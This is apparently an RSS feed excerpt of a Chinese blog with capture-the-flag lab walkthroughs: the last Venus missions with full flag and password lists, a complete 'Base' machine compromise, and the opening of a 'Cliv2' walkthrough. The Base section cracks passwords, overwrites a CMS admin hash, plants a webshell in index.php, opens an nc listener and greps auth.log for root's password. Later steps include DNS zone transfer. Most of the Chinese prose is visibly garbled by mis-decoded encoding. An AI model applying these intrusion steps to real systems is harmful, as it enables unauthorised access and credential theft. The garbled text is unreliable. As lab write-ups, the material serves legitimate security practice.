- **‰ªªÂä°**: `clara` ÁöÑÂØÜÁ†ÅÂú®‰∏Ä‰∏™ 1968 Âπ¥ 5 Êúà 1 Êó•‰πãÂêé‰øÆÊîπËøáÁöÑÊñá‰ª∂‰∏≠„ÄÇÔºàËøôÈáåËá™Â∑±ÊÉ≥ÊÉ≥ÂäûÊ≥ïÔºåÊàë‰∏çÊÉ≥Â§çÁé∞‰∫ÜÔºâ

1.  Ê†πÊçÆÊèêÁ§∫ÔºåÂèØ‰ª•Êé®Êñ≠Êñá‰ª∂ÁöÑ‰øÆÊîπÊó∂Èó¥ÊØîËæÉÁâπÊÆä„ÄÇÁªèËøáÊü•ÊâæÔºåÂèëÁé∞‰∏Ä‰∏™Êó∂Èó¥Êà≥ÈùûÂ∏∏Êó©ÁöÑÊñá‰ª∂„ÄÇ

    ```bash
    eva@venus:~$ ls -al /usr/lib/cmdo
    -rw-r--r-- 1 root root 16 Jan  1  1970 /usr/lib/cmdo
    ```

2.  ËØªÂèñËØ•Êñá‰ª∂ÂÜÖÂÆπ„ÄÇ

    ```bash
    eva@venus:~$ cat /usr/lib/cmdo
    39YziWp5gSvgQN9
    ```

3.  ÂàáÊç¢Âà∞ `clara` Áî®Êà∑„ÄÇ

    ```bash
    eva@venus:~$ su clara
    Password: 39YziWp5gSvgQN9
    ```

---

## **Mission 0x18: clara -&gt; frida**
- **‰ªªÂä°**: `frida` ÁöÑÂØÜÁ†ÅÂú®‰∏Ä‰∏™ÂèóÂØÜÁ†Å‰øùÊä§ÁöÑ zip Êñá‰ª∂‰∏≠ÔºåÊèêÁ§∫ `rockyou.txt` Â≠óÂÖ∏ÂèØËÉΩ‰ºöÊúâÂ∏ÆÂä©„ÄÇ

1.  È¶ñÂÖàÂ∞Ü `protected.zip` Êñá‰ª∂ `base64` ÁºñÁ†ÅÂπ∂Â§çÂà∂Âà∞Êú¨Âú∞„ÄÇ

    ```bash
    clara@venus:~$ base64 protected.zip
    UEsDBAoACQAAAIMzhVhzdJ8jHAAAABAAAAAZABwAcHduZWQvY2xhcmEvcHJvdGVjdGVkLnR4dFVU
    CQAD9pkPZvaZD2Z1eAsAAQQAAAAABAAAAACc/uQ52ED8vSTlcON+hM2vBK6cXas6YlcIf/9rUEsH
    CHN0nyMcAAAAEAAAAFBLAQIeAwoACQAAAIMzhVhzdJ8jHAAAABAAAAAZABgAAAAAAAEAAACkgQAA
AABwd25lZC9jbGFyYS9wcm90ZWN0ZWQudHh0VVQFAAP2mQ9mdXgLAAEEAAAAAAQAAAAAUEsFBgAA
AAABAAEAXwAAAH8AAAAAAA==
    ```

2.  Âú®Êú¨Âú∞Ôºå‰ΩøÁî® `john` Âíå `rockyou.txt` Â≠óÂÖ∏ÁàÜÁ†¥ zip ÂØÜÁ†Å„ÄÇ

    ```bash
    # Âú®Êú¨Âú∞KaliÁ≠âÁ≥ªÁªü‰∏äÊâßË°å
    echo '...' | base64 -d &gt; protected.zip
    zip2john protected.zip &gt; hash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash
    # ...
    # ÁàÜÁ†¥Âá∫ÂØÜÁ†Å‰∏∫ pass123
    ```

3.  ‰ΩøÁî®ÁàÜÁ†¥Âá∫ÁöÑÂØÜÁ†ÅËß£ÂéãÊñá‰ª∂ÔºåÂπ∂ËØªÂèñ `frida` ÁöÑÂØÜÁ†Å„ÄÇ

    ```bash
    # Âú®Êú¨Âú∞KaliÁ≠âÁ≥ªÁªü‰∏äÊâßË°å
    7z x protected.zip # ËæìÂÖ•ÂØÜÁ†Å pass123
    cat pwned/clara/protected.txt
    Ed4ErEUJEaMcXli
    ```

4.  ÂàáÊç¢Âà∞ `frida` Áî®Êà∑„ÄÇ

    ```bash
    clara@venus:~$ su frida
    Password: Ed4ErEUJEaMcXli
    ```

---

## **Mission 0x19: frida -&gt; eliza**
- **‰ªªÂä°**: `eliza` ÁöÑÂØÜÁ†ÅÊòØ `repeated.txt` Êñá‰ª∂‰∏≠ÂîØ‰∏ÄÈáçÂ§çÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ

1.  ÂØπÊñá‰ª∂ÊéíÂ∫èÂêéÔºå‰ΩøÁî® `uniq -d` ÂèØ‰ª•ÊâæÂà∞ÈáçÂ§çÁöÑË°å„ÄÇ

    ```bash
    frida@venus:~$ awk 'NR==1{prev=$0; next} $0==prev{print prev} {prev=$0}' repeated.txt
    Fg6b6aoksceQqB9
    ```

2.  ÂàáÊç¢Âà∞ `eliza` Áî®Êà∑„ÄÇ

    ```bash
    frida@venus:~$ su eliza
    Password: Fg6b6aoksceQqB9
    ```

---

## **Mission 0x20: eliza -&gt; iris**
- **‰ªªÂä°**: `iris` ÁªôÊàëÁïô‰∏ã‰∫ÜÂ•πÁöÑÂØÜÈí•„ÄÇ

1.  Âú® `eliza` ÁöÑÂÆ∂ÁõÆÂΩï‰∏≠ÔºåÊâæÂà∞‰∫Ü `.iris_key`ÔºåËøôÊòØ SSH ÁßÅÈí•„ÄÇ

    ```bash
    eliza@venus:~$ ls -al
    # ...
    -rw-r----- 1 root  eliza 2602 Apr  5  2024 .iris_key
    ```

2.  ‰ΩøÁî®Ëøô‰∏™ÁßÅÈí•ÈÄöËøá SSH ÁôªÂΩïÂà∞ `iris` Ë¥¶Êà∑„ÄÇ

    ```bash
    eliza@venus:~$ ssh iris@127.0.0.1 -i .iris_key
    Welcome to Debian GNU/Linux 11 (bullseye)!
    # ...
    iris@venus:~$
    ```

---

## **Mission 0x21: iris -&gt; eloise**
- **‰ªªÂä°**: `eloise` Áî®‰∏ÄÁßçÁâπÊÆäÁöÑÊñπÂºè‰øùÂ≠ò‰∫ÜÂ•πÁöÑÂØÜÁ†Å„ÄÇ

1.  Âú® `iris` ÂÆ∂ÁõÆÂΩï‰∏≠ÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `eloise` ÁöÑÊñá‰ª∂ÔºåÂÜÖÂÆπÁúãËµ∑Êù•ÊòØ Base64 ÁºñÁ†ÅÁöÑ„ÄÇ

    ```bash
    iris@venus:~$ cat eloise
    /9j/4AAQSkZJRgABAQEAYABgAAD/4RDSRXhpZgAATU0AKgAAAAgABAE7AAIAAAAEc01MAIdpAAQA
    # ... (ÁúÅÁï•)
    ```

2.  Â∞ÜÂÜÖÂÆπÂ§çÂà∂Âà∞Êú¨Âú∞ÔºåËß£Á†ÅÂêéÂèëÁé∞ÊòØ‰∏Ä‰∏™ JPEG ÂõæÁâáÊñá‰ª∂„ÄÇ

    ```bash
    # Âú®Êú¨Âú∞KaliÁ≠âÁ≥ªÁªü‰∏äÊâßË°å
    cat eloise_base64.txt | base64 -d &gt; eloise.jpg
    file eloise.jpg
    # eloise.jpg: JPEG image data ...
    ```

3.  ÊâìÂºÄÂõæÁâáÔºåÂõæÁâá‰∏≠ÊòæÁ§∫‰∫ÜÂØÜÁ†ÅÔºö`yOUJlV0SHOnbSPm`„ÄÇ

4.  ÂàáÊç¢Âà∞ `eloise` Áî®Êà∑„ÄÇ

    ```bash
    iris@venus:~$ su eloise
    Password: yOUJlV0SHOnbSPm
    eloise@venus:~$
    ```

---

# **Flag Ê±áÊÄª**

```bash
1.  sophia:   8===LUzzNuv8NB59iztWUIQS===D~~
2.  angela:   8===SjMYBmMh4bk49TKq7PM8===D~~
3.  emma:     8===0daqdDlmd9XogkiHu4yq===D~~
4.  mia:      8===FBMdY8hel2VMA3BaYJin===D~~
5.  camila:   8===iDIi5sm1mDuqGmU5Psx6===D~~
6.  luna:     8===KCO34FpIq3nBmHbyZvFh===D~~
7.  eleanor:  8===Iq5vbyiQl4ipNrLDArjD===D~~
8.  victoria: 8===NWyTFi9LLqVsZ4OnuZYN===D~~
9.  isla:     8===ZyZqc1suvGe4QlkZHFlq===D~~
10. violet:   8===LzErk0qFPYJj16mNnnYZ===D~~
11. lucy:     8===AdCJ4wl8pmbhi770Xbd3===D~~
12. elena:    8===st1pTdqEQ0bvrJfWGwLA===D~~
13. alice:    8===Qj4NNWp8LOC96S9Rtgrk===D~~
14. anna:     8===5Y3DhT66fa6Da8RpLKG0===D~~
15. natalia:  8===JWHa1GQq1AYrBWNXEJrH===D~~
16. eva:      8===22cqk3iGkGYVqnYrHiof===D~~
17. clara:    8===EJWmHDEQeEN1vIR7NYiH===D~~
18. frida:    8===Ikg2qj8KT2bGJtWvR6hC===D~~
19. eliza:    8===zwWIPyDf2ozwVhCTxm1I===D~~
20. iris:     8===ClrdWOqlZ1vL61zSk9Va===D~~
21. eloise:   8===57CzBLKaEq2N8YBFRu31===D~~
```

# Pass

```bash
01: sophia/Y1o645M3mR84ejc
02: angela/oh5p9gAABugHBje
03: emma/fIvltaGaq0OUH8O
04: mia/iKXIYg0pyEH2Hos
05: camila/F67aDmCAAgOOaOc
06: luna/j3vkuoKQwvbhkMc
07: eleanor/UNDchvln6Bmtu7b
08: victoria/pz8OqvJBFxH0cSj
09: isla/D3XTob0FUImsoBb
10: violet/WKINVzNQLKLDVAc
11: lucy/OCmMUjebG53giud
12: elena/4xZ5lIKYmfPLg9t
13: alice/Cgecy2MY2MWbaqt
14: anna/w8NvY27qkpdePox
15: natalia/NMuc4DkYKDsmZ5z
16: eva/upsCA3UFu10fDAO
17: clara/39YziWp5gSvgQN9
18: frida/Ed4ErEUJEaMcXli
19: eliza/Fg6b6aoksceQqB9
20: iris/kYjyoLcnBZ9EJdz
21: eloise/yOUJlV0SHOnbSPm
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Labs_venus1to21.html</guid><pubDate>Wed, 06 Aug 2025 00:54:26 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Base</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Base.html</link><description>![image-20250724102315597](http://7r1UMPHK.github.io/image/20250724102323560.webp)

ÊµÖÊµÖÂ®±‰πê‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l          
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.210 08:00:27:5d:66:94       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fc:a8:ce       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.965 seconds (130.28 hosts/sec). 4 responded
```

192.168.205.210ÁöÑip

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 22:24 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:5D:66:94 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
```

Áúã80Á´ØÂè£
![image-20250724102447816](http://7r1UMPHK.github.io/image/20250724102448088.webp)

ÁúãÂà∞‰∫ÜÁâàÊú¨Âè∑Ôºå‰ΩÜÊòØËøô‰∏™Èù∂Êú∫‰∏çÊòØÊâìÈÇ£‰∏™ÔºåÊâÄ‰ª•‰∏çÁî®ÁÆ°

ËøõË°åÁõÆÂΩïÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db -t 64 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.210
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip,db
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.210/images/]
/.php                 (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 9329]
/users.db             (Status: 200) [Size: 12288]
/robots.txt           (Status: 200) [Size: 33]
/LICENSE.txt          (Status: 200) [Size: 14900]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/UPGRADE.txt          (Status: 200) [Size: 956]
Progress: 461907 / 1323360 (34.90%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 462062 / 1323360 (34.92%)
===============================================================
Finished
===============================================================
```

ÊÑüÂÖ¥Ë∂£ÁöÑÊúâ`robots.txt`„ÄÅ`user.db`

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl 192.168.205.210/robots.txt                                           
User-agent: *
Disallow: /pivotx/
```

Ëøô‰∏™Â∫îËØ•ÊòØcmsÁöÑ‰∏ªÈ°µÊöÇÊó∂‰∏çÁÆ°

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ wget http://192.168.205.210/users.db
--2025-07-23 22:27:37--  http://192.168.205.210/users.db
Ê≠£Âú®ËøûÊé• 192.168.205.210:80... Â∑≤ËøûÊé•„ÄÇ
Â∑≤ÂèëÂá∫ HTTP ËØ∑Ê±ÇÔºåÊ≠£Âú®Á≠âÂæÖÂõûÂ∫î... 200 OK
ÈïøÂ∫¶Ôºö12288 (12K)
Ê≠£Âú®‰øùÂ≠òËá≥: ‚Äúusers.db‚Äù

users.db                                  100%[=====================================================================================&gt;]  12.00K  --.-KB/s  Áî®Êó∂ 0s      

2025-07-23 22:27:37 (703 MB/s) - Â∑≤‰øùÂ≠ò ‚Äúusers.db‚Äù [12288/12288])

                                                                                                                                                                        
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ file users.db 
users.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2
                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ file users.db 
users.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2
           
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ sqlite3 users.db                   
SQLite version 3.46.1 2024-08-13 09:16:08
Enter '.help' for usage hints.
sqlite&gt; .tables
users
sqlite&gt; select * from users;
1|hungry|aHVuZ3J5
```

`aHVuZ3J5`ÊòØhungryÁöÑbase64ÁºñÁ†Å

ÂéªÊâæÊâæÁôªÂΩïÂè£

ÂèëÁé∞ÊâìÂºÄ`/pivotx/`Â∞±‰ºöË∑≥ËΩ¨ÁôªÂΩï

Â∞ùËØïÁôªÂΩïÊó†ÊûúÔºåÂéªÂ∞ùËØïssh

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ssh hungry@192.168.205.210                                                                                                                   
The authenticity of host '192.168.205.210 (192.168.205.210)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
Linux Base 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
 ____                 
| __ )  __ _ ___  ___ 
|  _ \ / _` / __|/ _ \
| |_) | (_| \__ \  __/
|____/ \__,_|___/\___|
                      
hungry@Base:~$ id
uid=1000(hungry) gid=1000(hungry) groups=1000(hungry)
```

ÁôªÂΩïÊàêÂäüÔºåËøôÈáåÊúâ‰∏§‰∏™ÊÄùË∑Ø

Á¨¨‰∏Ä‰∏™Ôºå‰Ω†ÂèØ‰ª•Ê†πÊçÆÈù∂Êú∫ÂêçÂ≠óbaseÂíåsshÁôªÂΩïÂØÜÁ†ÅÂèëÁé∞ËßÑÂæãÔºåÂÆÉ‰ΩøÁî®ÁöÑÂØÜÁ†ÅÂèäÂÖ∂ÊúâÂèØËÉΩÊòØÁªèËøábase64ÁºñÁ†ÅÁöÑÔºåÊâÄ‰ª•‰Ω†ÂèØ‰ª•Â∞Ü‰∏Ä‰∫õÂ≠óÂÖ∏ÁºñÁ†ÅÁîüÊàêÊúâÈíàÂØπÊÄßÁöÑÂ≠óÂÖ∏
```
while IFS= read -r line; do
    echo -n '$line' | base64
done &lt; xato-net-10-million-passwords-100000.txt  &gt; 100000base.txt
```

ËøôÈáå‰∏∫‰ªÄ‰πà‰ΩøÁî®`xato-net-10-million-passwords-100000.txt`ÊòØÂõ†‰∏∫ÊàëÂèëÁé∞Â•ΩÂÉèÊàë‰ª¨Â∏∏ËßÅÁöÑÂº±ÂØÜÁ†ÅÂú®`xato`ÈáåÈù¢ÊòØÊØîËæÉÂâçÁöÑÔºåËÄå`rockyou`ÊØîËæÉÂêéÈù¢ÔºåÂ¶Ç`admin123`

ÂØÜÁ†ÅÊòØtoddÁöÑbase64ÁºñÁ†ÅÔºåÂú®`xato`ÁöÑ5k+ÔºåÂú®`rockyou`ÁöÑ13wÂ∑¶Âè≥

Á¨¨‰∫å‰∏™ÊñπÊ≥ïÊòØÊ®™ÂêëÂõûwww-data

```
hungry@Base:~$ id www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
```

ÂÆÉÊúâ‰∏Ä‰∏™`adm`ÁªÑÊùÉÈôêÔºåËøô‰∏™ÊùÉÈôêÂèØ‰ª•ÁúãlogÊó•ÂøóÊñá‰ª∂

```
hungry@Base:~$ cd /var/www/html/
hungry@Base:/var/www/html$ ls -al
total 76
drwxr-xr-x  4 root     root      4096 Jul 20 00:52 .
drwxr-xr-x  3 root     root      4096 Apr  4 23:20 ..
-rw-r--r--  1 www-data www-data    27 Jul 20 00:24 creds.txt
-rw-r--r--  1 www-data www-data  3389 Jun 22  2023 example.htaccess
-rw-r--r--  1 www-data www-data  4253 Jun 22  2023 example.web.config
drwxr-xr-x  2 www-data www-data  4096 Jun 22  2023 images
-rw-r--r--  1 www-data www-data   612 Jun 22  2023 index.php
-rw-r--r--  1 www-data www-data 14900 Jun 22  2023 LICENSE.txt
drwxr-xr-x 12 www-data www-data  4096 Jun 22  2023 pivotx
-rw-r--r--  1 www-data www-data   311 Jun 22  2023 README.md
-rw-r--r--  1 www-data www-data    33 Jun 22  2023 robots.txt
-rw-r--r--  1 www-data www-data   956 Jun 22  2023 UPGRADE.txt
-rw-r--r--  1 root     root     12288 Jul 20 00:30 users.db
hungry@Base:/var/www/html$ cat creds.txt 
guest:guest
admin:YWRtaW*=
```

‰∏Ä‰∏™ÊòØËÆøÂÆ¢ÂØÜÁ†ÅÔºåÊ≤°ÊúâÁªìÊûúbase64ÁºñÁ†ÅÔºå‰∏Ä‰∏™ÊòØadminÁÆ°ÁêÜÂëòÁî®Êà∑ÁöÑÂØÜÁ†ÅÔºåÁªèËøá‰∫Übase64ÁºñÁ†ÅÔºåËøôÈáåÂ∞±ËÄÉÈ™å‰Ω†ÊúâÊ≤°ÊúâÁúãËøábase64ÁöÑ`admin`‰∫ÜÔºåÂΩìÁÑ∂‰Ω†ÁàÜÁ†¥‰πüÊòØÂèØ‰ª•ÁöÑ„ÄÇwebÊúâÁàÜÁ†¥ÈôêÂà∂ÔºåÂèØ‰ª•ÂéªÊâíÊãâ`/db/user`Êñá‰ª∂Êãø`hash`ÁàÜÁ†¥

```
hungry@Base:/var/www/html$ cd pivotx/db/
hungry@Base:/var/www/html/pivotx/db$ ls -al
total 96
drwxr-xr-x 11 www-data www-data 4096 Jul 20 00:25 .
drwxr-xr-x 12 www-data www-data 4096 Jun 22  2023 ..
drwxrwxrwx  2 www-data www-data 4096 Jul 20 00:25 cache
-rw-r--r--  1 www-data www-data  202 Jun 22  2023 index.html
drwxrwxrwx  2 www-data www-data 4096 Jul 20 00:08 pages
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 refkeys
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 rsscache
drwxr-xr-x  2 www-data www-data 4096 Jul 20 00:08 search
-rw-rw-rw-  1 www-data www-data  268 Jul 20 00:25 ser-archives.php
-rw-rw-rw-  1 www-data www-data  309 Jul 20 00:09 ser_categories.php
-rw-rw-rw-  1 www-data www-data   90 Jul 20 00:08 ser-cats.php
-rw-rw-rw-  1 www-data www-data 2729 Jul 20 00:08 ser_config.php
-rw-rw-rw-  1 www-data www-data   95 Jul 20 00:08 ser-dates.php
-rw-rw-rw-  1 www-data www-data  389 Jul 20 00:09 ser_events.php
-rw-rw-rw-  1 www-data www-data  165 Jul 20 00:08 ser_logins.php
-rw-rw-rw-  1 www-data www-data  148 Jul 20 00:08 ser_sessions.php
-rw-rw-rw-  1 www-data www-data  118 Jul 23 22:29 ser_tags.php
-rw-rw-rw-  1 www-data www-data  117 Jul 20 00:08 ser-uris.php
-rw-rw-rw-  1 www-data www-data  604 Jul 20 00:09 ser_users.php
-rw-rw-rw-  1 www-data www-data 2692 Jul 23 22:29 ser_weblogs.php
drwxrwxrwx  2 www-data www-data 4096 Jul 20 00:08 standard-00000
drwxr-xr-x  2 www-data www-data 4096 Jul 20 00:08 tagdata
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 tbkeys
drwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 users
hungry@Base:/var/www/html/pivotx/db$ cat ser_users.php
&lt;?php /* pivot */ die(); ?&gt;a:2:{i:0;a:10:{s:8:'username';s:5:'admin';s:5:'email';s:15:'admin@admin.com';s:9:'userlevel';i:4;s:8:'nickname';s:4:'root';s:8:'language';s:2:'en';s:5:'image';N;s:15:'text_processing';i:5;s:4:'salt';s:6:'phpass';s:8:'password';s:34:'$P$C4HR7UH4rgIvtiTUko9sm5X2wnXvVe1';s:8:'lastseen';i:1752984498;}i:1;a:9:{s:8:'username';s:5:'guest';s:5:'email';s:15:'guest@admin.com';s:9:'userlevel';s:1:'1';s:8:'nickname';s:5:'guest';s:8:'language';s:2:'en';s:5:'image';s:0:'';s:15:'text_processing';s:1:'5';s:4:'salt';s:6:'phpass';s:8:'password';s:34:'$P$CKuO3Fs4IYzSqVFJi1TCLNSXd3yCaK1';}}
```

ÊàñËÄÖ‰Ω†Áõ¥Êé•‰∏çÁàÜÁ†¥‰∫ÜÔºåÁõ¥Êé•ÊõøÊç¢`admin`ÁöÑhash‰∏∫`guest`ÁöÑhashÔºåÂõ†‰∏∫`ser_users.php`Êñá‰ª∂Êàë‰ª¨ÊúâÂÜôÂÖ•ÁöÑÊùÉÈôêÔºåÁúã‰Ω†ÂñúÊ¨¢

ËøõÂéªcms‰πãÂêéÔºåÂú®`http://192.168.205.210/pivotx/index.php?page=homeexplore`ÁÆ°ÁêÜÊñá‰ª∂È°µÈù¢ÔºåÁõ¥Êé•‰øÆÊîπ

index.phpÁöÑÂÜÖÂÆπ‰∏∫ËöÅÂâëÁöÑantÊñá‰ª∂Â∞±Â•Ω‰∫ÜÔºàÁõ¥Êé•‰øÆÊîπÊàêreverce shellÂíåcmdÂ•ΩÂÉè‰∏çË°åÔºåÂÆÉÂ•ΩÂÉèÊúâ‰∫õËøáÊª§„ÄÇÊàñËÄÖ‰Ω†Ê†πÊçÆÈÇ£‰∏™rceÁöÑ‰øÆÊîπÔºåÈÇ£‰∏™ÊòØÂèØ‰ª•ÁöÑÔºâ

kaliÁõëÂê¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888           
listening on [any] 8888 ...
```

‰ΩøÁî®ËöÅÂâëËøûÊé•ÔºåÂºπshell

Á®≥ÂÆöshell

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

Áõ¥Êé•ÊâíÊãâÊó•Âøó

```
www-data@Base:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
www-data@Base:/var/www/html$ cd /var/log
www-data@Base:/var/log$ grep -i -r 'password\|pass\|passwd' auth.log 
Jul 19 23:59:05 moban passwd[528]: pam_unix(passwd:chauthtok): password changed for root
Jul 19 23:58:27 moban sudo[381]: root : password changed to 'dG9kZA==
Jul 20 00:05:17 moban sshd[548]: Accepted password for root from 192.168.3.94 port 60280 ssh2
Jul 20 00:10:50 moban passwd[831]: pam_unix(passwd:chauthtok): password changed for hungry
Jul 20 00:30:55 moban passwd[1026]: pam_unix(passwd:chauthtok): password changed for hungry
Jul 20 00:31:43 moban sshd[1031]: Accepted password for root from 192.168.3.94 port 36218 ssh2
Jul 20 00:32:02 moban passwd[1044]: pam_unix(passwd:chauthtok): password changed for root
Jul 20 00:44:17 Base sshd[433]: Accepted password for root from 192.168.3.94 port 47964 ssh2
Jul 20 00:52:12 Base sshd[433]: Accepted password for root from 192.168.3.94 port 55854 ssh2
Jul 23 22:30:22 Base sshd[583]: Accepted password for hungry from 192.168.205.128 port 34874 ssh2
```

dG9kZA==

ÁôªÂΩï‰∏Ä‰∏ã

```
www-data@Base:/var/log$ su -
Password: 
 ____                 
| __ )  __ _ ___  ___ 
|  _ \ / _` / __|/ _ \
| |_) | (_| \__ \  __/
|____/ \__,_|___/\___|
                      
root@Base:~# cat /root/root.txt /home/hungry/user.txt 
flag{root}
flag{user-051a0db9a92e4dacc70212da32fd0638}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Base.html</guid><pubDate>Wed, 06 Aug 2025 00:53:05 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Cliv2</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Cliv2.html</link><description>![image-20250803203858485](http://7r1UMPHK.github.io/image/20250803203858632.webp)

# **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## 1. ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî® `arp-scan` Âú®Êú¨Âú∞ÁΩëÁªúËøõË°åÊâ´ÊèèÔºåÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫ IP Âú∞ÂùÄ‰∏∫ `192.168.205.240`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.240 08:00:27:aa:bc:4b       PCS Systemtechnik GmbH
...
```

## 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

ÈÄöËøá `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÁ°ÆËÆ§ÂÖ∂ÂºÄÊîæ‰∫Ü 22 (SSH), 53 (DNS) Âíå 80 (HTTP) Á´ØÂè£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.240
...
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

ÂØπ DNS ÊúçÂä°ËøõË°åÁâàÊú¨‰æ¶ÂØüÔºåÁ°ÆËÆ§‰∏∫ ISC BIND 9.16.50„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p53 -sC -sV 192.168.205.240
...
PORT   STATE SERVICE VERSION
53/tcp open  domain  ISC BIND 9.16.50 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.16.50-Debian
...
```

## 3. Web ‰∏é DNS ‰æ¶ÂØü

Áõ¥Êé•ËÆøÈóÆÁõÆÊ†á IP ÁöÑ 80 Á´ØÂè£ÔºåÈ°µÈù¢‰ºöËá™Âä®ÈáçÂÆöÂêëÂà∞ÂüüÂêç `http://cliv2.dsz/`„ÄÇÂõ†Ê≠§ÔºåÈ¶ñÂÖàÂú®ÊîªÂáªÊú∫‰∏äÈÖçÁΩÆ `/etc/hosts` Êñá‰ª∂ÔºåÂ∞ÜËØ•ÂüüÂêçÊåáÂêëÁõÆÊ†á IP„ÄÇ

```bash
# Âú® /etc/hosts Êñá‰ª∂‰∏≠Ê∑ªÂä†
192.168.205.240 cliv2.dsz
```

Áî±‰∫éÁõÆÊ†áÂºÄÊîæ‰∫Ü DNS ÊúçÂä°ÔºåÂ∞ùËØïËøõË°å DNS Âå∫Âüü‰º†ÈÄÅÔºàAXFRÔºâÊîªÂáªÔºåÊàêÂäüËé∑Âèñ‰∫ÜÂ§ö‰∏™Â≠êÂüüÂêç„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ dig axfr @192.168.205.240 cliv2.dsz
...
cliv2.dsz.              86400   IN      A       127.0.0.1
3170a7.cliv2.dsz.       86400   IN      A       127.0.0.1
client.cliv2.dsz.       86400   IN      A       127.0.0.1
dev.cliv2.dsz.          86400   IN      A       127.0.0.1
